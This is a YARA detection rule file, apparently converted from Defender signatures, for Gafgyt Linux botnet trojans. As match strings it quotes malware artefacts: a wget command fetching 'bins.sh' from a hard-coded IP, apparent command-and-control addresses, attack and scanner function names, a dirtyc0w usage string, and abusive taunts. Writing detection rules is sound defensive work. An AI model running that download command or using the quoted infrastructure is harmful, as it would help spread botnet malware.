rule Trojan_Linux_Gafgyt_AC_2147764403_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Linux/Gafgyt.AC!MTB"
        threat_id = "2147764403"
        type = "Trojan"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "libc/sysdeps/linux/sparc/crti.S" ascii //weight: 1
        $x_1_2 = "curl_wget_attack" ascii //weight: 1
        $x_1_3 = "wget http://107.189.11.54/bins.sh" ascii //weight: 1
        $x_1_4 = "attack_methods.c" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Trojan_Linux_Gafgyt_A_2147788201_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Linux/Gafgyt.A!xp"
        threat_id = "2147788201"
        type = "Trojan"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {1c 80 85 8f 64 83 99 8f 2c bf a5 24 09 f8 20 03 21 20 00 02 38 00 bc 8f 3a 00 40 10 21 30 20 02 00 85 99 8f 06 00 05 26 09 f8 20 03 21 20 00 02 38 00 bc 8f 21 20 00 02 1c 80 85 8f 5c 82 99 8f 34 bf a5 24 09 f8 20 03 21 30 00 02 38 00 bc 8f 21 20 00 02 1c 80 85 8f 44 85 99 8f 00 00 00 00 09 f8 20 03 d4 b9 a5 24 38 00 bc 8f 16 00 00 10 21 88 40 00}  //weight: 1, accuracy: High
        $x_1_2 = "x2F/x2B/x32/x33/x3D/x2F/x3C/x7D/x70/x22/x3F/x28/x27/x20/x2E/x30/x74/x3F/x74/x23/x72/x70/x35/x33/x36/x26/x74/x2C/x31/x2D/x75/x2F/x2B/x21/x7D/x3D/x2B/x37/x33/x32/x70/x21/x36/x2B/x32/x2D/x3F/" ascii //weight: 1
        $x_1_3 = "Running Processes" ascii //weight: 1
        $x_1_4 = "FuckYourC2" ascii //weight: 1
        $x_1_5 = "MASSMURDER" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Trojan_Linux_Gafgyt_B_2147788202_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Linux/Gafgyt.B!xp"
        threat_id = "2147788202"
        type = "Trojan"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "makevsepacket" ascii //weight: 1
        $x_1_2 = "vseattack" ascii //weight: 1
        $x_1_3 = "185.172.110.242:" ascii //weight: 1
        $x_1_4 = "dirtyc0w target_file new_content" ascii //weight: 1
        $x_1_5 = "infected by hubnr" ascii //weight: 1
        $x_1_6 = "VsE On UR FuCkKKkKkKiNNNG FoReAhEAD OOOooPs I SpeLlEd ThAT WrOnG FuCk ME" ascii //weight: 1
        $x_1_7 = "ThiSitY iS a Scary Haxer and will PooP on your hacker bOaTnEt system RebOOt go kill yourself" ascii //weight: 1
        $x_1_8 = "cncinput" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Trojan_Linux_Gafgyt_C_2147788203_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Linux/Gafgyt.C!xp"
        threat_id = "2147788203"
        type = "Trojan"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = " Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii //weight: 2
        $x_1_2 = "cncinput" ascii //weight: 1
        $x_1_3 = "_scanner" ascii //weight: 1
        $x_1_4 = "vseattack" ascii //weight: 1
        $x_1_5 = "OVHDOWN1" ascii //weight: 1
        $x_1_6 = "netlink_scanner_kill" ascii //weight: 1
        $x_1_7 = "51.254.23.237:" ascii //weight: 1
        $x_2_8 = "lXfYC7TFaCq5Hv982wuIiKcHlgFA0jEsW2OFQStO7x6zN9dBgayyWgvbk0L3lZClzJCmFG3GVNDFc2iTHNYy7gss8dHboBdeKE1VcblH1AxrVyiqokw2RYFvd4cd1QxyaHawwP6go9feBeHdlvMRDLbEbty3Py8yVT3UTjy3ZKONXmMNvURTUZTkeH37XT9H5JwH0vKB1Yw2rSYk" ascii //weight: 2
        $x_1_9 = "STDHEX" ascii //weight: 1
        $x_1_10 = "billybobbot.com/crawler" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Trojan_Linux_Gafgyt_A_2147960955_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Linux/Gafgyt.A!AMTB"
        threat_id = "2147960955"
        type = "Trojan"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "AMTB: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_4_1 = "158.94.210.88" ascii //weight: 4
        $x_3_2 = "[%s:%d] detected newer instance running! suicide()" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Linux_Gafgyt_HAC_2147960960_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Linux/Gafgyt.HAC!MTB"
        threat_id = "2147960960"
        type = "Trojan"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "58"
        strings_accuracy = "High"
    strings:
        $x_9_1 = "/proc/%d/exe" ascii //weight: 9
        $x_11_2 = "%x:%x:%x:%x:%x:%x:%d.%d.%d.%d" ascii //weight: 11
        $x_8_3 = "User-Agent: %s" ascii //weight: 8
        $x_17_4 = "data=random_data" ascii //weight: 17
        $x_13_5 = ":]:%x %63[" ascii //weight: 13
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

